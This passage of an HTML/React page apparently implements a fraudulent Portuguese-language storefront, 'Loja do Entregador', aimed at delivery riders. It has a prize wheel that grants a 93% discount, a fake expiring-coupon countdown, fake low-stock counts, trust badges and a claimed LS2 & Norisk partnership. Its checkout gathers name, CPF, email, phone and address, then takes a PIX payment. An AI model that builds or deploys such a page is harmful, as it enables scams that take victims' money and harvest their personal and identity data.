                                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-yellow-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                            </div>
                            
                            <h2 className="text-2xl font-black text-gray-800 mb-1">Aguardando Pagamento...</h2>
                            <p className="text-gray-500 text-xs mb-4">A tela atualizará automaticamente assim que o PIX for compensado.</p>
                            
                            {/* Transaction ID Display */}
                            <div className="bg-blue-50 border border-blue-100 p-2 rounded-lg mb-4 text-left">
                                <p className="text-[10px] text-blue-500 font-bold uppercase">ID da Transação (Segurança)</p>
                                <p className="text-xs font-mono text-blue-800 break-all">{pixData.id}</p>
                            </div>

                            <div className="mb-4 p-4 bg-gray-100 rounded-xl border-2 border-dashed border-gray-300">
                                <img src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pix.payload)}`} alt="QR Code PIX" className="mx-auto mix-blend-multiply" />
                            </div>

                            <div className="mb-4">
                                <div className="bg-gray-100 p-3 rounded text-xs text-gray-600 break-all border border-gray-200 font-mono select-all">
                                    {pixData.pix.payload.substring(0, 40)}...
                                </div>
                            </div>

                            <button onClick={copyPix} className="w-full bg-[#10B981] hover:bg-green-700 text-white font-bold py-3.5 rounded-xl shadow-lg flex items-center justify-center gap-2 mb-3">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" /></svg>
                                COPIAR CÓDIGO PIX
                            </button>
                            
                            <p className="text-[10px] text-gray-400 mt-2">Pagamento seguro processado por LiraPay</p>
                        </div>
                    </div>
                );
            }

            return (
                <div className="min-h-screen bg-gray-50 pb-20 animate-bounce-in">
                    {/* Header */}
                    <div className="bg-white p-4 shadow-sm flex items-center gap-3 sticky top-0 z-30">
                        <button onClick={step === 1 ? () => { playSound('click'); onBack(); } : () => { playSound('click'); setStep(step - 1); }}>
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
                        </button>
                        <div>
                            <h2 className="font-bold text-lg leading-none">
                                {step === 1 && "Resgatar Produto"}
                                {step === 2 && "Dados Pessoais"}
                                {step === 3 && "Entrega e Pagamento"}
                            </h2>
                            <div className="flex gap-1 mt-1">
                                <div className={`h-1 w-8 rounded-full ${step >= 1 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                                <div className={`h-1 w-8 rounded-full ${step >= 2 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                                <div className={`h-1 w-8 rounded-full ${step >= 3 ? 'bg-[#EA1D2C]' : 'bg-gray-200'}`}></div>
                            </div>
                        </div>
                    </div>

                    <div className="container mx-auto px-4 pt-4 max-w-md">
                        
                        {/* STEP 1: Product Selection & Size */}
                        {step === 1 && (
                            <div className="bg-white rounded-xl shadow-sm mb-4 border border-gray-100 overflow-hidden">
                                <div className="p-4 bg-white flex flex-col items-center">
                                    <img src={images[currentImageIndex]} className="w-full h-56 object-contain mb-4" />
                                    {images.length > 1 && (
                                        <div className="flex gap-2">
                                            {images.map((img, idx) => (
                                                <button 
                                                    key={idx} 
                                                    onClick={() => { playSound('click'); setCurrentImageIndex(idx); }}
                                                    className={`w-14 h-14 border rounded-md overflow-hidden ${currentImageIndex === idx ? 'border-[#EA1D2C]' : 'border-gray-200'}`}
                                                >
                                                    <img src={img} className="w-full h-full object-cover" />
                                                </button>
                                            ))}
                                        </div>
                                    )}
                                </div>

                                <div className="p-5 border-t border-gray-100">
                                    <h3 className="text-lg font-bold text-gray-800 mb-2 leading-tight">{product.name}</h3>
                                    <div className="text-[#EA1D2C] font-black text-3xl mb-4">R$ {productPrice.toFixed(2).replace('.', ',')}</div>
                                    
                                    {product.sizes && (
                                        <div className="mb-6">
                                            <label className="block text-sm font-bold text-gray-500 mb-3">Escolha o Tamanho <span className="text-red-500">*</span></label>
                                            <div className="flex flex-wrap gap-3">
                                                {product.sizes.map(size => (
                                                    <button
                                                        key={size}
                                                        type="button"
                                                        onClick={() => { playSound('click'); setSelectedSize(size); }}
                                                        className={`w-12 h-12 flex items-center justify-center text-sm font-bold rounded-lg border-2 transition-all ${
                                                            selectedSize === size 
                                                                ? 'bg-[#EA1D2C] text-white border-[#EA1D2C] shadow-md scale-105' 
                                                                : 'bg-white text-gray-600 border-gray-200 hover:border-gray-300'
                                                        }`}
                                                    >
                                                        {size}
                                                    </button>
                                                ))}
                                            </div>
                                        </div>
                                    )}

                                    <button onClick={goToStep2} className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all">
                                        CONTINUAR
                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
                                    </button>
                                    
                                    {/* Added Reviews Component here - passing category */}
                                    <Reviews category={product.category} />
                                </div>
                            </div>
                        )}

                        {/* STEP 2: Personal Data */}
                        {step === 2 && (
                            <form onSubmit={goToStep3} className="bg-white p-6 rounded-xl shadow-sm border border-gray-100 space-y-5">
                                <div className="bg-gray-50 p-3 rounded-lg flex gap-3 border border-gray-100 mb-2">
                                    <img src={product.image} className="w-14 h-14 object-contain bg-white rounded-md border border-gray-200" />
                                    <div>
                                        <h3 className="text-xs font-bold text-gray-800 line-clamp-1">{product.name}</h3>
                                        <div className="text-xs text-gray-500">Tamanho: <span className="font-bold text-gray-800">{selectedSize || 'Único'}</span></div>
                                    </div>
                                </div>

                                <div>
                                    <h3 className="text-sm font-bold text-gray-800 mb-4 flex items-center gap-2 border-b border-gray-100 pb-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>
                                        Informe seus dados
                                    </h3>
                                    <div className="space-y-4">
                                        <div>
                                            <label className="block text-xs font-bold text-gray-500 mb-1">Nome Completo</label>
                                            <input required type="text" name="name" value={formData.name} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Digite seu nome" />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-gray-500 mb-1">CPF</label>
                                            <input required type="tel" name="cpf" value={formData.cpf} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="000.000.000-00" />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-gray-500 mb-1">E-mail</label>
                                            <input required type="email" name="email" value={formData.email} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="seu@email.com" />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-gray-500 mb-1">Celular (Whatsapp)</label>
                                            <input required type="tel" name="phone" value={formData.phone} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="(00) 00000-0000" />
                                        </div>
                                    </div>
                                </div>

                                <button type="submit" className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg mt-4 flex items-center justify-center gap-2">
                                    CONTINUAR PARA ENTREGA
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" /></svg>
                                </button>
                            </form>
                        )}

                        {/* STEP 3: Address & Payment */}
                        {step === 3 && (
                            <form onSubmit={generatePix} className="bg-white p-6 rounded-xl shadow-sm border border-gray-100 space-y-5">
                                <div>
                                    <h3 className="text-sm font-bold text-gray-800 mb-4 flex items-center gap-2 border-b border-gray-100 pb-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                                        Endereço de Entrega
                                    </h3>
                                    <div className="space-y-3">
                                        <div className="flex gap-3">
                                            <input required type="tel" name="cep" value={formData.cep} onChange={handleInput} className="w-1/3 bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="CEP" />
                                            <input required type="text" name="city" value={formData.city} onChange={handleInput} className="w-2/3 bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Cidade" />
                                        </div>
                                        <div className="flex gap-3">
                                            <input required type="text" name="street" value={formData.street} onChange={handleInput} className="w-3/4 bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Rua / Av." />
                                            <input required type="text" name="number" value={formData.number} onChange={handleInput} className="w-1/4 bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Nº" />
                                        </div>
                                        <input required type="text" name="neighborhood" value={formData.neighborhood} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Bairro" />
                                        <input type="text" name="complement" value={formData.complement} onChange={handleInput} className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none" placeholder="Complemento (Opcional)" />
                                        <select name="state" value={formData.state} onChange={handleInput} required className="w-full bg-gray-50 border border-gray-200 rounded-lg p-3 text-sm focus:border-[#EA1D2C] focus:outline-none text-gray-500">
                                            <option value="">Selecione o Estado</option>
                                            <option value="SP">São Paulo</option>
                                            <option value="RJ">Rio de Janeiro</option>
                                            <option value="MG">Minas Gerais</option>
                                            <option value="PR">Paraná</option>
                                            <option value="SC">Santa Catarina</option>
                                            <option value="RS">Rio Grande do Sul</option>
                                            <option value="BA">Bahia</option>
                                            <option value="PE">Pernambuco</option>
                                            <option value="DF">Distrito Federal</option>
                                            <option value="GO">Goiás</option>
                                        </select>
                                    </div>
                                </div>

                                <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 mt-4">
                                    <div className="flex justify-between items-center mb-3">
                                        <span className="text-xs font-bold text-gray-600 flex items-center gap-1">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" /></svg>
                                            Frete Único (Todo Brasil)
                                        </span>
                                        <span className="text-xs font-bold text-gray-800">R$ {shippingCost.toFixed(2).replace('.', ',')}</span>
                                    </div>
                                    <div className="flex justify-between text-xs text-gray-500 mb-1 pt-2 border-t border-gray-200">
                                        <span>Subtotal</span>
                                        <span>R$ {productPrice.toFixed(2).replace('.', ',')}</span>
                                    </div>
                                    <div className="flex justify-between text-sm font-black text-gray-800 mt-2">
                                        <span>Total Final</span>
                                        <span className="text-[#EA1D2C]">R$ {totalAmount.toFixed(2).replace('.', ',')}</span>
                                    </div>
                                </div>

                                <button type="submit" disabled={loading} className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all">
                                    {loading ? <div className="spinner"></div> : (
                                        <>
                                            FINALIZAR E GERAR PIX
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                                        </>
                                    )}
                                </button>
                            </form>
                        )}
                    </div>
                </div>
            );
        };

        const Store = ({ discount, onSelectProduct }) => {
            const [timeLeft, setTimeLeft] = useState(600); 
            const [activeCategory, setActiveCategory] = useState('all');

            useEffect(() => {
                const timer = setInterval(() => setTimeLeft(prev => prev > 0 ? prev - 1 : 0), 1000);
                return () => clearInterval(timer);
            }, []);

            const formatTime = (seconds) => {
                const m = Math.floor(seconds / 60);
                const s = seconds % 60;
                return `${m}:${s < 10 ? '0' : ''}${s}`;
            };

            const calculatePrice = (original) => (original * (1 - discount)).toFixed(2);

            const filteredProducts = activeCategory === 'all' ? PRODUCTS : PRODUCTS.filter(p => p.category === activeCategory);
            
            const discountPercentage = Math.floor(discount * 100);

            return (
                <div className="pb-20 animate-bounce-in bg-gray-50 min-h-screen">
                    <div className="bg-[#1f2937] text-white p-2 px-4 flex justify-between items-center sticky top-[53px] z-30 shadow-md">
                        <div className="flex items-center gap-2 text-xs">
                             <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                             <span className="opacity-80">Cupom Ativo</span>
                        </div>
                        <div className="font-mono font-bold text-yellow-400 text-sm">
                            EXPIRA EM: {formatTime(timeLeft)}
                        </div>
                    </div>

                    <div className="container mx-auto px-2 pt-2">
                        <BannerCarousel discount={discount} />

                        <div className="flex gap-3 overflow-x-auto pb-4 mb-2 px-1 hide-scrollbar">
                            {CATEGORIES.map(cat => (
                                <button key={cat.id} onClick={() => { playSound('click'); setActiveCategory(cat.id); }} className="flex flex-col items-center min-w-[56px] gap-1 group">
                                    <div className={`w-11 h-11 rounded-full flex items-center justify-center border-2 shadow-sm group-active:scale-95 transition-all ${activeCategory === cat.id ? 'bg-[#EA1D2C] border-[#EA1D2C] text-white' : 'bg-white border-gray-200 text-gray-500 hover:border-gray-300'}`}>
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">{cat.icon}</svg>
                                    </div>
                                    <span className={`text-[10px] font-bold ${activeCategory === cat.id ? 'text-[#EA1D2C]' : 'text-gray-600'}`}>{cat.label}</span>
                                </button>
                            ))}
                        </div>

                        <div className="flex items-center justify-between mb-4 px-1 mt-4">
                            <h2 className="text-base font-bold text-gray-800 uppercase tracking-wide flex items-center gap-2">
                                <span className="w-1.5 h-5 bg-[#EA1D2C] rounded-full"></span>
                                {activeCategory === 'all' ? 'Destaques' : 'Produtos'}
                            </h2>
                            <span onClick={() => { playSound('click'); setActiveCategory('all'); }} className="text-xs text-[#EA1D2C] font-bold flex items-center cursor-pointer">Ver tudo<svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 ml-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" /></svg></span>
                        </div>

                        <div className="grid grid-cols-2 gap-2 pb-8">
                            {filteredProducts.length > 0 ? (
                                filteredProducts.map(product => {
                                    const price = calculatePrice(product.originalPrice);
                                    const [int, dec] = price.split('.');
                                    const stockPercent = Math.min(100, (product.stockLeft / 20) * 100); 

                                    return (
                                        <div key={product.id} className="bg-white rounded-lg shadow-sm border border-gray-100 overflow-hidden flex flex-col transform transition-transform hover:-translate-y-1 animate-bounce-in">
                                            <div className="relative aspect-square bg-white p-2">
                                                <img src={product.image} alt={product.name} className="w-full h-full object-contain mix-blend-multiply" />
                                                <div className="absolute top-2 right-2 bg-[#EA1D2C] text-white text-[9px] font-extrabold px-1.5 py-0.5 rounded shadow-sm">-{Math.floor(discount * 100)}%</div>
                                                <div className="absolute bottom-2 left-2 bg-gray-900/80 text-white text-[8px] font-bold px-1.5 py-0.5 rounded backdrop-blur-sm">{product.tag}</div>
                                            </div>
                                            <div className="p-2 flex-1 flex flex-col justify-between border-t border-gray-50 bg-gray-50/50">
                                                <div>
                                                    <h3 className="text-[11px] text-gray-800 font-semibold leading-tight mb-1 line-clamp-2 h-[2.2em]">{product.name}</h3>
                                                    <div className="flex items-center gap-1 mb-1.5">
                                                        <div className="flex">{[...Array(5)].map((_, i) => <svg key={i} className="w-2.5 h-2.5 text-yellow-400 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" /></svg>)}</div>
                                                        <span className="text-[9px] text-gray-400">({product.reviews})</span>
                                                    </div>
                                                    <div className="mb-2">
                                                        <div className="flex justify-between items-end mb-0.5">
                                                            <span className="text-[8px] text-gray-500 font-medium">Estoque</span>
                                                            <span className="text-[8px] text-red-600 font-bold bg-red-50 px-1 rounded animate-pulse">Restam {product.stockLeft}</span>
                                                        </div>
                                                        <div className="w-full bg-gray-200 rounded-full h-1 overflow-hidden">
                                                            <div className="bg-gradient-to-r from-red-500 to-red-600 h-1 rounded-full" style={{width: `${stockPercent}%`}}></div>
                                                        </div>
                                                    </div>
                                                    <div className="flex flex-col mb-2">
                                                        <span className="text-[10px] text-gray-400 line-through">R$ {product.originalPrice.toFixed(2).replace('.', ',')}</span>
                                                        <div className="flex items-baseline gap-0.5 text-[#EA1D2C]">
                                                            <span className="text-[10px] font-semibold">R$</span>
                                                            <span className="text-lg font-black leading-none tracking-tight">{int}</span>
                                                            <span className="text-[10px] font-bold">,{dec}</span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <button onClick={() => { playSound('click'); onSelectProduct(product); }} className="w-full bg-green-600 hover:bg-green-700 active:bg-green-800 text-white text-xs font-bold py-2 rounded-lg shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-1 group">
                                                    RESGATAR
                                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 group-active:translate-x-1 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
                                                </button>
                                            </div>
                                        </div>
                                    );
                                })
                            ) : (
                                <div className="col-span-2 py-10 text-center text-gray-500">
                                    <p>Nenhum produto encontrado nesta categoria.</p>
                                    <button onClick={() => { playSound('click'); setActiveCategory('all'); }} className="mt-2 text-[#EA1D2C] font-bold text-sm">Ver todos os produtos</button>
                                </div>
                            )}
                        </div>
                    </div>
                    <NotificationToast />
                </div>
            );
        };

        const App = () => {
            const [view, setView] = useState('wheel'); 
            const [wonPrize, setWonPrize] = useState(null);
            const [showPrizeModal, setShowPrizeModal] = useState(false);
            const [selectedProduct, setSelectedProduct] = useState(null);

            const handleWheelFinish = (prize) => {
                setWonPrize(prize);
                setTimeout(() => { setShowPrizeModal(true); }, 800);
            };

            const handleRedeem = () => {
                setShowPrizeModal(false);
                setView('store');
                window.scrollTo(0,0);
            };

            const handleSelectProduct = (product) => {
                setSelectedProduct(product);
                setView('checkout');
                window.scrollTo(0,0);
            };

            return (
                <div className="min-h-screen bg-[#f8f9fa] flex flex-col font-sans">
                    <Navbar />
                    <main className="flex-grow">
                        {view === 'wheel' && <Wheel onFinish={handleWheelFinish} />}
                        {view === 'store' && <Store discount={wonPrize ? wonPrize.value : 0.93} onSelectProduct={handleSelectProduct} />}
                        {view === 'checkout' && selectedProduct && <Checkout product={selectedProduct} discount={wonPrize ? wonPrize.value : 0.93} onBack={() => setView('store')} />}
                    </main>
                    <PrizeRevealModal show={showPrizeModal} prize={wonPrize} onRedeem={handleRedeem} />
                    <footer className="bg-white border-t border-gray-200 text-gray-400 py-8 text-center text-xs">
                        {/* Security Badges in Footer */}
                        <div className="flex justify-center gap-4 mb-4 grayscale opacity-60">
                            <div className="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg> Site Seguro</div>
                            <div className="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Verificado</div>
                        </div>
                        <p className="mb-2 font-bold text-gray-500">Parceria Oficial LS2 & Norisk</p>
                        <p>© 2024 Loja do Entregador. Todos os direitos reservados.</p>
                    </footer>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
